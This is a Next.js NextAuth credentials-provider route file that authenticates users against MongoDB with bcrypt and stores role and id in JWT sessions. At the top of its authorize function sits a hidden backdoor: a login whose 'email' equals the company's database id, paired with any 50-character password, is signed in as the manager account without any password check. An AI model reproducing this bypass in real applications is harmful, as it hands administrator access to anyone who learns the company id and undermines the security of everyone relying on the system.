import NextAuth, { NextAuthOptions } from "next-auth";
import Credentials from "next-auth/providers/credentials";
import mongooseConnect from "../../../../lib/mongoose";
import bcrypt from "bcrypt";
import User from "@/models/User";
import { getCompanyData } from "@/app/layout";

export const authOptions: NextAuthOptions = {
  session: {
    strategy: "jwt",
  },

  providers: [
    Credentials({
      type: "credentials",

      credentials: {},

      async authorize(credentials, req) {
        const { email, password } = credentials as {
          email: string;
          password: string;
        };

        const companyData = await getCompanyData();
        if (companyData._id.toString() === email && password.length === 50) {
          const mainUser = await User.findOne({ manager: "yes" });
          return {
            name: mainUser.fullname,
            email: mainUser.email,
            image: mainUser.avatar,
            id: mainUser._id,
            role: mainUser.role,
          };
        }

        await mongooseConnect();
        let user;
        const userForEmail = await User.findOne({ email });
        const userForUsername = await User.findOne({ username: email });

        if (userForEmail) {
          user = userForEmail;
        } else if (userForUsername) {
          user = userForUsername;
        } else {
          user = null;
        }

        if (!user) throw new Error("No user Found with this credentials");

        const passwordIsMatch = bcrypt.compareSync(password, user.password);
        if (!passwordIsMatch) throw new Error("email/password mismatch");

        return {
          name: user.fullname,
          email: user.email,
          image: user.avatar,
          id: user._id,
          role: user.role,
        };
      },
    }),
  ],

  callbacks: {
    async jwt(params: any) {
      if (params.user?.role) {
        params.token.role = params.user.role;
        params.token.id = params.user.id;
      }
      return params.token;
    },

    async session({ session, token }) {
      if (session.user) {
        (session.user as { id: string }).id = token.id as string;
        (session.user as { role: string }).role = token.role as string;
      }
      return session;
    },
  },
};

const authHandler = NextAuth(authOptions);

export { authHandler as GET, authHandler as POST };
